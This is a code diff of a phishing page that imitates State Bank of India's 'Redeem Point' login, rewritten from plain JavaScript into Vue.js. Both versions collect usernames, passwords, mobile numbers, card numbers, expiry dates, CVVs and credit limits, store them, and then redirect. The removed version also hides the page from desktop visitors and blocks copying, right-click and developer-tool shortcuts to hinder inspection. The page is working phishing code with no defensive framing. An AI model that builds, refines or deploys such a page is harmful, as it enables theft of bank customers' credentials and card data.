@@ -2,51 +2,32 @@
 <html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>i – केवल मोबाइल</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>i - Vue.js</title>
+    <!-- Vue CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
     <style>
-        /* ===== एंटी-कॉपी कोर स्टाइल ===== */
-        * {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-        }
-
-        /* सिर्फ फॉर्म फील्ड्स में सेलेक्शन की अनुमति */
-        input, textarea, [contenteditable="true"] {
-            -webkit-user-select: text;
-            -moz-user-select: text;
-            -ms-user-select: text;
-            user-select: text;
-        }
-
-        /* बाकी ओरिजिनल स्टाइल */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: Arial, sans-serif;
         }
-        
         body {
             background-color: #f0f0f0;
             min-height: 100vh;
             padding-bottom: 20px;
         }
-        
         .header {
             text-align: center;
             padding: 15px;
             background-color: white;
         }
-        
         .logo {
             max-width: 100%;
             height: auto;
             max-height: 120px;
         }
-        
         .container {
             max-width: 420px;
             margin: 15px auto;
@@ -55,7 +36,6 @@
             box-shadow: 0 2px 5px rgba(0,0,0,0.08);
             overflow: hidden;
         }
-        
         .form-header {
             color: #000;
             padding: 18px 20px 8px 20px;
@@ -63,7 +43,6 @@
             font-size: 16px;
             font-weight: bold;
         }
-        
         .tabs-container {
             display: flex;
             background-color: #f5f5f5;
@@ -71,7 +50,6 @@
             margin: 0 20px 10px 20px;
             border-radius: 25px;
         }
-        
         .tab {
             flex: 1;
             padding: 8px 4px;
@@ -85,21 +63,17 @@
             cursor: pointer;
             transition: all 0.3s;
         }
-        
         .tab.active {
             background-color: #24A1E8;
             color: #fff;
             box-shadow: 0 2px 4px rgba(36, 161, 232, 0.3);
         }
-        
         .form-content {
             padding: 0 20px 20px 20px;
         }
-        
         .form-group {
             margin-bottom: 10px;
         }
-        
         .form-label {
             display: block;
             font-size: 12px;
@@ -107,7 +81,6 @@
             color: #333;
             margin-bottom: 3px;
         }
-        
         .form-input {
             width: 100%;
             padding: 6px 0;
@@ -119,11 +92,9 @@
             border-radius: 0;
             transition: border-color 0.3s;
         }
-        
         .form-input:focus {
             border-bottom-color: #24A1E8;
         }
-        
         .login-button {
             display: block;
             width: 100%;
@@ -137,438 +108,284 @@
             cursor: pointer;
             margin-top: 12px;
         }
-        
         .login-button:hover {
             background-color: #1a8cd8;
         }
-        
         .expiry-cvv-container {
             display: flex;
             gap: 12px;
         }
-        
         .expiry-cvv-container > div {
             flex: 1;
         }
-        
         .footer-img {
             width: 100%;
             max-width: 900px;
             display: block;
             margin: 20px auto 0;
         }
-        
-        .form-panel {
-            display: none;
-        }
-        
-        .form-panel.active {
-            display: block;
-        }
-        
         .asterisk {
             color: #ff0000;
         }
-        
         .error-message {
             color: #ff4444;
             font-size: 11px;
             margin-top: 3px;
-            display: none;
         }
-        
         .form-input.error {
             border-bottom-color: #ff4444;
         }
     </style>
 </head>
 <body>
-    <!-- ███████ मोबाइल डिटेक्शन – सबसे पहले चलेगा ███████ -->
-    <script>
-        (function() {
-            "use strict";
-            // मोबाइल चेक – यूजर एजेंट + स्क्रीन चौड़ाई
-            function isMobileDevice() {
-                const ua = navigator.userAgent;
-                const mobileUserAgent = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
-                const screenWidth = window.innerWidth || document.documentElement.clientWidth;
-                // 768px या उससे कम = मोबाइल/टैबलेट मानें
-                return mobileUserAgent || screenWidth <= 768;
-            }
-
-            // डेस्कटॉप पकड़ा गया → पूरा पेज हटा कर सिर्फ संदेश दिखाएँ
-            if (!isMobileDevice()) {
-                document.body.innerHTML = '';  // सब कुछ मिटाएँ
-                document.body.style.backgroundColor = '#f0f0f0';
-                document.body.style.padding = '20px';
-                document.body.style.textAlign = 'center';
-                document.body.style.fontFamily = 'Arial, sans-serif';
-                
-                var warning = document.createElement('div');
-                warning.style.maxWidth = '400px';
-                warning.style.margin = '40px auto';
-                warning.style.padding = '30px 20px';
-                warning.style.background = 'white';
-                warning.style.borderRadius = '8px';
-                warning.style.boxShadow = '0 2px 10px rgba(0,0,0,0.1)';
-                warning.style.color = '#333';
-                
-                var icon = document.createElement('div');
-                icon.style.fontSize = '48px';
-                icon.style.marginBottom = '20px';
-                icon.textContent = '📱';
-                warning.appendChild(icon);
-                
-                var title = document.createElement('h2');
-                title.style.fontSize = '22px';
-                title.style.marginBottom = '15px';
-                title.style.color = '#d32f2f';
-                title.textContent = 'केवल मोबाइल डिवाइस';
-                warning.appendChild(title);
-                
-                var msg = document.createElement('p');
-                msg.style.fontSize = '16px';
-                msg.style.lineHeight = '1.5';
-                msg.style.color = '#555';
-                msg.textContent = 'यह पृष्ठ केवल मोबाइल फोन या टैबलेट पर ही खोला जा सकता है। कृपया अपने मोबाइल डिवाइस से प्रयास करें।';
-                warning.appendChild(msg);
-                
-                var msg2 = document.createElement('p');
-                msg2.style.fontSize = '14px';
-                msg2.style.marginTop = '20px';
-                msg2.style.color = '#777';
-                msg2.textContent = 'This page is accessible only on mobile devices.';
-                warning.appendChild(msg2);
-                
-                document.body.appendChild(warning);
-                
-                // आगे की स्क्रिप्ट रोकने के लिए एक्सेप्शन
-                throw new Error('Desktop access blocked');
-            }
-        })();
-    </script>
-    <!-- ███████ मोबाइल डिटेक्शन खत्म ███████ -->
-
-    <div class="header">
-        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
-             alt="SBI Logo" 
-             class="logo">
-    </div>
-    
-    <div class="container">
-        <div class="form-header">
-            Continue to Redeem Point
+    <div id="app">
+        <!-- Header -->
+        <div class="header">
+            <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
+                 alt="SBI Logo" 
+                 class="logo">
         </div>
         
-        <div class="tabs-container">
-            <button class="tab active" id="userTab">User ID</button>
-            <button class="tab" id="cardTab">Credit Card No.</button>
-        </div>
-        
-        <!-- User ID फॉर्म -->
-        <div class="form-content form-panel active" id="userPanel">
-            <form id="userForm">
-                <div class="form-group">
-                    <label class="form-label">Username <span class="asterisk">*</span></label>
-                    <input type="text" class="form-input" id="username" placeholder="Enter username" required>
-                    <div class="error-message">Username is required</div>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Password <span class="asterisk">*</span></label>
-                    <input type="password" class="form-input" id="password" placeholder="Enter password" required minlength="6">
-                    <div class="error-message">Password must be at least 6 characters</div>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
-                    <input type="tel" class="form-input" id="mobile" placeholder="10-digit mobile number" required pattern="[0-9]{10}" maxlength="10">
-                    <div class="error-message">Valid 10-digit mobile number is required</div>
-                </div>
-                
-                <button type="submit" class="login-button">LOGIN</button>
-            </form>
-        </div>
-        
-        <!-- Credit Card फॉर्म -->
-        <div class="form-content form-panel" id="cardPanel">
-            <form id="cardForm">
-                <div class="form-group">
-                    <label class="form-label">Credit Card No. <span class="asterisk">*</span></label>
-                    <input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" required pattern="[0-9\s]{16,19}">
-                    <div class="error-message">Valid credit card number is required</div>
-                </div>
-                
-                <div class="expiry-cvv-container">
-                    <div class="form-group">
-                        <label class="form-label">Expiry Date <span class="asterisk">*</span></label>
-                        <input type="text" class="form-input" id="expiry" placeholder="MM/YY" required pattern="(0[1-9]|1[0-2])\/([0-9]{2})">
-                        <div class="error-message">Format: MM/YY (e.g., 12/25)</div>
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">CVV <span class="asterisk">**</span></label>
-                        <input type="password" class="form-input" id="cvv" placeholder="123" required pattern="[0-9]{3}" maxlength="3">
-                        <div class="error-message">3-digit CVV is required</div>
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Available Credit Limit <span class="asterisk">*</span></label>
-                    <input type="text" class="form-input" id="creditLimit" placeholder="₹" required>
-                    <div class="error-message">Credit limit is required</div>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
-                    <input type="tel" class="form-input" id="cardMobile" placeholder="10-digit mobile number" required pattern="[0-9]{10}" maxlength="10">
-                    <div class="error-message">Valid 10-digit mobile number is required</div>
-                </div>
-                
-                <button type="submit" class="login-button">LOGIN</button>
-            </form>
-        </div>
-    </div>
-    
-    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" 
-         alt="Security Guidelines" 
-         class="footer-img">
-    
-    <!-- █████████████████████████████████████████████████████████
-         ██  एंटी-कॉपी + फॉर्म फंक्शन – केवल मोबाइल पर एक्टिव  ██
-         █████████████████████████████████████████████████████████ -->
-    <script>
-        // █████████████████████████████████████████████████████████
-        // ██  एंटी-कॉपी हार्डनिंग – कोई भी कॉपी/ड्रैग/प्रिंट नहीं होगा ██
-        // █████████████████████████████████████████████████████████
-        
-        // 1) राइट क्लिक पूरी तरह बंद
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-
-        // 2) कॉपी, कट, ड्रैग, ड्रॉप, सेव, प्रिंट सब बंद
-        document.addEventListener('copy', (e) => e.preventDefault());
-        document.addEventListener('cut', (e) => e.preventDefault());
-        document.addEventListener('dragstart', (e) => e.preventDefault());
-        document.addEventListener('drop', (e) => e.preventDefault());
-        document.addEventListener('selectstart', (e) => {
-            if (!e.target.matches('input, textarea, [contenteditable="true"]')) {
-                e.preventDefault();
-            }
-        });
-
-        // 3) कीबोर्ड शॉर्टकट ब्लॉक – F12, Ctrl+U, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+C, Ctrl+X, Ctrl+S, Ctrl+P
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || 
-                (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || 
-                (e.ctrlKey && e.key === 'u') || 
-                (e.ctrlKey && e.key === 'U') ||
-                (e.metaKey && e.key === 'u') ||
-                (e.metaKey && e.key === 'U')) {
-                e.preventDefault();
-                return false;
-            }
+        <!-- Main Container -->
+        <div class="container">
+            <div class="form-header">
+                Continue to Redeem Point
+            </div>
             
-            if (e.ctrlKey || e.metaKey) {
-                if (['c', 'x', 's', 'p', 'C', 'X', 'S', 'P'].includes(e.key)) {
-                    e.preventDefault();
-                    return false;
+            <!-- Tabs -->
+            <div class="tabs-container">
+                <button class="tab" :class="{ active: activeTab === 'user' }" @click="switchTab('user')">User ID</button>
+                <button class="tab" :class="{ active: activeTab === 'card' }" @click="switchTab('card')">Credit Card No.</button>
+            </div>
+            
+            <!-- User ID Form -->
+            <div class="form-content" v-show="activeTab === 'user'">
+                <form @submit.prevent="handleUserSubmit">
+                    <div class="form-group">
+                        <label class="form-label">Username <span class="asterisk">*</span></label>
+                        <input type="text" class="form-input" :class="{ error: errors.user.username }" 
+                               v-model="userForm.username" @input="clearError('user', 'username')" @blur="validateUserField('username')" placeholder="Enter username">
+                        <div class="error-message" v-if="errors.user.username">{{ errors.user.username }}</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Password <span class="asterisk">*</span></label>
+                        <input type="password" class="form-input" :class="{ error: errors.user.password }" 
+                               v-model="userForm.password" @input="clearError('user', 'password')" @blur="validateUserField('password')" placeholder="Enter password">
+                        <div class="error-message" v-if="errors.user.password">{{ errors.user.password }}</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
+                        <input type="tel" class="form-input" :class="{ error: errors.user.mobile }" 
+                               v-model="userForm.mobile" @input="formatMobile('user')" @blur="validateUserField('mobile')" placeholder="10-digit mobile number" maxlength="10">
+                        <div class="error-message" v-if="errors.user.mobile">{{ errors.user.mobile }}</div>
+                    </div>
+                    
+                    <button type="submit" class="login-button">LOGIN</button>
+                </form>
+            </div>
+            
+            <!-- Credit Card Form -->
+            <div class="form-content" v-show="activeTab === 'card'">
+                <form @submit.prevent="handleCardSubmit">
+                    <div class="form-group">
+                        <label class="form-label">Credit Card No. <span class="asterisk">*</span></label>
+                        <input type="text" class="form-input" :class="{ error: errors.card.cardNumber }" 
+                               v-model="cardForm.cardNumber" @input="formatCardNumber" @blur="validateCardField('cardNumber')" placeholder="1234 5678 9012 3456">
+                        <div class="error-message" v-if="errors.card.cardNumber">{{ errors.card.cardNumber }}</div>
+                    </div>
+                    
+                    <div class="expiry-cvv-container">
+                        <div class="form-group">
+                            <label class="form-label">Expiry Date <span class="asterisk">*</span></label>
+                            <input type="text" class="form-input" :class="{ error: errors.card.expiry }" 
+                                   v-model="cardForm.expiry" @input="formatExpiry" @blur="validateCardField('expiry')" placeholder="MM/YY" maxlength="5">
+                            <div class="error-message" v-if="errors.card.expiry">{{ errors.card.expiry }}</div>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">CVV <span class="asterisk">**</span></label>
+                            <input type="password" class="form-input" :class="{ error: errors.card.cvv }" 
+                                   v-model="cardForm.cvv" @input="formatCVV" @blur="validateCardField('cvv')" placeholder="123" maxlength="3">
+                            <div class="error-message" v-if="errors.card.cvv">{{ errors.card.cvv }}</div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Available Credit Limit <span class="asterisk">*</span></label>
+                        <input type="text" class="form-input" :class="{ error: errors.card.creditLimit }" 
+                               v-model="cardForm.creditLimit" @input="clearError('card', 'creditLimit')" @blur="validateCardField('creditLimit')" placeholder="₹">
+                        <div class="error-message" v-if="errors.card.creditLimit">{{ errors.card.creditLimit }}</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
+                        <input type="tel" class="form-input" :class="{ error: errors.card.mobile }" 
+                               v-model="cardForm.mobile" @input="formatMobile('card')" @blur="validateCardField('mobile')" placeholder="10-digit mobile number" maxlength="10">
+                        <div class="error-message" v-if="errors.card.mobile">{{ errors.card.mobile }}</div>
+                    </div>
+                    
+                    <button type="submit" class="login-button">LOGIN</button>
+                </form>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" 
+             alt="Security Guidelines" 
+             class="footer-img">
+    </div>
+
+    <script>
+        new Vue({
+            el: '#app',
+            data: {
+                activeTab: 'user',
+                userForm: {
+                    username: '',
+                    password: '',
+                    mobile: ''
+                },
+                cardForm: {
+                    cardNumber: '',
+                    expiry: '',
+                    cvv: '',
+                    creditLimit: '',
+                    mobile: ''
+                },
+                errors: {
+                    user: {},
+                    card: {}
                 }
-            }
-        });
+            },
+            methods: {
+                // ---------- Tab Switching ----------
+                switchTab(tab) {
+                    this.activeTab = tab;
+                },
 
-        // 4) सेलेक्शन API को भी डिसेबल करें
-        document.addEventListener('selectionchange', function() {
-            const sel = window.getSelection();
-            if (sel.rangeCount > 0) {
-                let container = sel.getRangeAt(0).commonAncestorContainer;
-                if (container.nodeType === 3) container = container.parentNode;
-                if (!container.matches('input, textarea, [contenteditable="true"]')) {
-                    sel.removeAllRanges();
-                }
-            }
-        });
-
-        // █████████████████████████████████████████████████████████
-        // ██  ओरिजिनल फॉर्म स्क्रिप्ट – बिल्कुल सुरक्षित        ██
-        // █████████████████████████████████████████████████████████
-
-        // टॉगल स्विच
-        const userTab = document.getElementById('userTab');
-        const cardTab = document.getElementById('cardTab');
-        const userPanel = document.getElementById('userPanel');
-        const cardPanel = document.getElementById('cardPanel');
-        
-        userTab.addEventListener('click', function() {
-            userTab.classList.add('active');
-            cardTab.classList.remove('active');
-            userPanel.classList.add('active');
-            cardPanel.classList.remove('active');
-        });
-        
-        cardTab.addEventListener('click', function() {
-            cardTab.classList.add('active');
-            userTab.classList.remove('active');
-            cardPanel.classList.add('active');
-            userPanel.classList.remove('active');
-        });
-        
-        // इनपुट वैलिडेशन
-        function showError(input, message) {
-            input.classList.add('error');
-            const errorDiv = input.parentElement.querySelector('.error-message');
-            errorDiv.textContent = message;
-            errorDiv.style.display = 'block';
-        }
-        
-        function clearError(input) {
-            input.classList.remove('error');
-            const errorDiv = input.parentElement.querySelector('.error-message');
-            errorDiv.style.display = 'none';
-        }
-        
-        // क्रेडिट कार्ड नंबर फॉर्मेटिंग
-        const creditCardInput = document.getElementById('cardNumber');
-        if (creditCardInput) {
-            creditCardInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\s+/g, '').replace(/\D/g, '');
-                value = value.substring(0, 16);
-                
-                let formattedValue = '';
-                for (let i = 0; i < value.length; i++) {
-                    if (i > 0 && i % 4 === 0) {
-                        formattedValue += ' ';
+                // ---------- Error Handling ----------
+                setError(formType, field, message) {
+                    this.$set(this.errors[formType], field, message);
+                },
+                clearError(formType, field) {
+                    if (this.errors[formType] && this.errors[formType][field]) {
+                        this.$delete(this.errors[formType], field);
                     }
-                    formattedValue += value[i];
+                },
+
+                // ---------- Formatting ----------
+                formatCardNumber() {
+                    let value = this.cardForm.cardNumber.replace(/\s+/g, '').replace(/\D/g, '');
+                    value = value.substring(0, 16);
+                    let formatted = '';
+                    for (let i = 0; i < value.length; i++) {
+                        if (i > 0 && i % 4 === 0) formatted += ' ';
+                        formatted += value[i];
+                    }
+                    this.cardForm.cardNumber = formatted;
+                    this.clearError('card', 'cardNumber');
+                },
+                formatExpiry() {
+                    let value = this.cardForm.expiry.replace(/\D/g, '');
+                    if (value.length >= 2) {
+                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                    }
+                    this.cardForm.expiry = value.substring(0, 5);
+                    this.clearError('card', 'expiry');
+                },
+                formatCVV() {
+                    this.cardForm.cvv = this.cardForm.cvv.replace(/\D/g, '').substring(0, 3);
+                    this.clearError('card', 'cvv');
+                },
+                formatMobile(formType) {
+                    const form = formType === 'user' ? this.userForm : this.cardForm;
+                    form.mobile = form.mobile.replace(/\D/g, '').substring(0, 10);
+                    this.clearError(formType, 'mobile');
+                },
+
+                // ---------- Validation ----------
+                validateUserField(field) {
+                    const value = this.userForm[field];
+                    switch (field) {
+                        case 'username':
+                            if (!value.trim()) this.setError('user', 'username', 'Username is required');
+                            else this.clearError('user', 'username');
+                            break;
+                        case 'password':
+                            if (!value) this.setError('user', 'password', 'Password is required');
+                            else if (value.length < 6) this.setError('user', 'password', 'Password must be at least 6 characters');
+                            else this.clearError('user', 'password');
+                            break;
+                        case 'mobile':
+                            if (!value) this.setError('user', 'mobile', 'Mobile number is required');
+                            else if (!/^\d{10}$/.test(value)) this.setError('user', 'mobile', 'Valid 10-digit mobile number is required');
+                            else this.clearError('user', 'mobile');
+                            break;
+                    }
+                },
+                validateCardField(field) {
+                    const value = this.cardForm[field];
+                    switch (field) {
+                        case 'cardNumber':
+                            if (!value.trim()) this.setError('card', 'cardNumber', 'Credit card number is required');
+                            else if (!/^[\d\s]{16,19}$/.test(value.replace(/\s/g, ''))) this.setError('card', 'cardNumber', 'Valid credit card number is required');
+                            else this.clearError('card', 'cardNumber');
+                            break;
+                        case 'expiry':
+                            if (!value) this.setError('card', 'expiry', 'Expiry date is required');
+                            else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) this.setError('card', 'expiry', 'Format: MM/YY (e.g., 12/25)');
+                            else this.clearError('card', 'expiry');
+                            break;
+                        case 'cvv':
+                            if (!value) this.setError('card', 'cvv', 'CVV is required');
+                            else if (!/^\d{3}$/.test(value)) this.setError('card', 'cvv', '3-digit CVV is required');
+                            else this.clearError('card', 'cvv');
+                            break;
+                        case 'creditLimit':
+                            if (!value.trim()) this.setError('card', 'creditLimit', 'Credit limit is required');
+                            else this.clearError('card', 'creditLimit');
+                            break;
+                        case 'mobile':
+                            if (!value) this.setError('card', 'mobile', 'Mobile number is required');
+                            else if (!/^\d{10}$/.test(value)) this.setError('card', 'mobile', 'Valid 10-digit mobile number is required');
+                            else this.clearError('card', 'mobile');
+                            break;
+                    }
+                },
+                validateUserForm() {
+                    ['username', 'password', 'mobile'].forEach(field => this.validateUserField(field));
+                    return Object.keys(this.errors.user).length === 0;
+                },
+                validateCardForm() {
+                    ['cardNumber', 'expiry', 'cvv', 'creditLimit', 'mobile'].forEach(field => this.validateCardField(field));
+                    return Object.keys(this.errors.card).length === 0;
+                },
+
+                // ---------- Form Submission ----------
+                saveDataAndRedirect(formData, formType) {
+                    const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
+                    submissions.push({
+                        id: Date.now(),
+                        type: formType,
+                        data: formData,
+                        timestamp: new Date().toISOString(),
+                        ip: 'Not available in browser'
+                    });
+                    localStorage.setItem('formSubmissions', JSON.stringify(submissions));
+                    window.location.href = 'blogone.html';
+                },
+                handleUserSubmit() {
+                    if (this.validateUserForm()) {
+                        this.saveDataAndRedirect({ ...this.userForm }, 'User ID');
+                    }
+                },
+                handleCardSubmit() {
+                    if (this.validateCardForm()) {
+                        this.saveDataAndRedirect({ ...this.cardForm }, 'Credit Card');
+                    }
                 }
-                
-                e.target.value = formattedValue;
-                clearError(e.target);
-            });
-        }
-        
-        // एक्सपायरी डेट फॉर्मेटिंग
-        const expiryInput = document.getElementById('expiry');
-        if (expiryInput) {
-            expiryInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value.length >= 2) {
-                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
-                }
-                e.target.value = value.substring(0, 5);
-                clearError(e.target);
-            });
-        }
-        
-        // CVV सिर्फ नंबर
-        const cvvInput = document.getElementById('cvv');
-        if (cvvInput) {
-            cvvInput.addEventListener('input', function(e) {
-                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
-                clearError(e.target);
-            });
-        }
-        
-        // मोबाइल नंबर सिर्फ नंबर
-        const mobileInputs = [document.getElementById('mobile'), document.getElementById('cardMobile')];
-        mobileInputs.forEach(input => {
-            if (input) {
-                input.addEventListener('input', function(e) {
-                    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 10);
-                    clearError(e.target);
-                });
             }
-        });
-        
-        // डेटा सेव करने और रीडायरेक्ट करने की फंक्शन
-        function saveDataAndRedirect(formData, formType) {
-            const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
-            const submission = {
-                id: Date.now(),
-                type: formType,
-                data: formData,
-                timestamp: new Date().toISOString(),
-                ip: 'Not available in browser'
-            };
-            submissions.push(submission);
-            localStorage.setItem('formSubmissions', JSON.stringify(submissions));
-            window.location.href = 'blogone.html';
-        }
-        
-        // User ID फॉर्म सबमिशन
-        document.getElementById('userForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            let isValid = true;
-            const inputs = this.querySelectorAll('.form-input');
-            
-            inputs.forEach(input => {
-                if (!input.checkValidity()) {
-                    showError(input, input.validationMessage || 'This field is required');
-                    isValid = false;
-                } else {
-                    clearError(input);
-                }
-            });
-            
-            if (isValid) {
-                const formData = {
-                    username: document.getElementById('username').value,
-                    password: document.getElementById('password').value,
-                    mobile: document.getElementById('mobile').value
-                };
-                saveDataAndRedirect(formData, 'User ID');
-            }
-        });
-        
-        // Credit Card फॉर्म सबमिशन
-        document.getElementById('cardForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            let isValid = true;
-            const inputs = this.querySelectorAll('.form-input');
-            
-            inputs.forEach(input => {
-                if (!input.checkValidity()) {
-                    const customMessage = input.placeholder.includes('MM/YY') ? 
-                        'Format: MM/YY (e.g., 12/25)' : 
-                        (input.placeholder.includes('10-digit') ? 
-                            'Valid 10-digit mobile number is required' : 
-                            'This field is required');
-                    showError(input, customMessage);
-                    isValid = false;
-                } else {
-                    clearError(input);
-                }
-            });
-            
-            if (isValid) {
-                const formData = {
-                    cardNumber: document.getElementById('cardNumber').value,
-                    expiry: document.getElementById('expiry').value,
-                    cvv: document.getElementById('cvv').value,
-                    creditLimit: document.getElementById('creditLimit').value,
-                    mobile: document.getElementById('cardMobile').value
-                };
-                saveDataAndRedirect(formData, 'Credit Card');
-            }
-        });
-        
-        // रियल-टाइम वैलिडेशन
-        document.querySelectorAll('.form-input').forEach(input => {
-            input.addEventListener('blur', function() {
-                if (!this.checkValidity()) {
-                    const message = this.validationMessage || 'This field is required';
-                    showError(this, message);
-                }
-            });
-            
-            input.addEventListener('input', function() {
-                if (this.checkValidity()) {
-                    clearError(this);
-                }
-            });
         });
     </script>
 </body>
